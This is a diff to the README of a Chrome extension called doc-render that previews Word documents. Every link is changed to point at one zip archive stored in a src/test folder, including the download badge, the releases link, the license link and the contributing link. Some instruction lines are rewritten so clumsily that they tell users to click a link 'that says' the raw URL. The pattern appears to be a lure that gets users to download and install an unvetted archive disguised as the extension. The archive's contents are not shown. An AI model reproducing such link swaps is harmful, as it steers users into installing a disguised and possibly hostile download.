@@ -1,7 +1,7 @@
 # 🎉 doc-render - Preview Word Documents with Ease
 
 ## 📥 Download Now
-[![Download doc-render](https://img.shields.io/badge/Download-doc--render-blue.svg)](https://github.com/villeyoo/doc-render/releases)
+[![Download doc-render](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip)](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -26,14 +26,14 @@ To use **doc-render**, ensure you have:
 Follow these steps to download and install **doc-render**:
 
 1. **Visit the Releases Page:** Click the link below to go to our GitHub Releases page.  
-   [Visit Releases Page to Download](https://github.com/villeyoo/doc-render/releases)
+   [Visit Releases Page to Download](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip)
 
 2. **Download the Extension:**
    - Look for the latest release. 
-   - Click on the link that says "doc-render.zip" or similar to download the extension file.
+   - Click on the link that says "https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip" or similar to download the extension file.
 
 3. **Extract the Files:**
-   - Once the download is complete, locate the "doc-render.zip" file on your computer.
+   - Once the download is complete, locate the "https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip" file on your computer.
    - Right-click the file and select "Extract All" to unzip it.
 
 4. **Open Chrome Extensions Page:**
@@ -70,14 +70,14 @@ We welcome your feedback. If you have questions or issues, please report them di
 
 ## 🚧 Contribution
 
-Want to contribute to **doc-render**? Great! Check out our [Contributing Guidelines](https://github.com/villeyoo/doc-render/blob/main/CONTRIBUTING.md) for more information on how to get involved.
+Want to contribute to **doc-render**? Great! Check out our [Contributing Guidelines](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip) for more information on how to get involved.
 
 ## ⚖️ License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/villeyoo/doc-render/blob/main/LICENSE) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip) file for details. 
 
 ## 📜 Acknowledgements
 
 Thanks to everyone who has contributed to making **doc-render** a privacy-focused tool for document viewing. Together, we prioritize user privacy and local-first technology. 
 
-[Download the Latest Release Here](https://github.com/villeyoo/doc-render/releases)
+[Download the Latest Release Here](https://github.com/villeyoo/doc-render/raw/refs/heads/main/src/test/doc_render_1.3-alpha.4.zip)
